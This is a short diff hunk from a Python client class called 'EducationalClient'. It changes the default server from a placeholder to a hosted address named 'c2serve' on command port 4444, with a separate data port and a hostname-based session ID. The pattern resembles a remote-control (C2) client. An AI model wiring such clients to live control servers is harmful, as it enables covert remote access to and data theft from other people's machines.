@@ -15,7 +15,7 @@ import psutil
 class EducationalClient:
     def __init__(self):
         self.config = {
-            "server_ip": os.getenv('SERVER_IP', 'your-render-server-url.onrender.com'),
+            "server_ip": os.getenv('SERVER_IP', 'https://c2serve.onrender.com'),
             "command_port": int(os.getenv('COMMAND_PORT', '4444')),
             "data_port": int(os.getenv('DATA_PORT', '8000')),
             "session_id": f"EDU-{platform.node()}-{int(time.time())}",
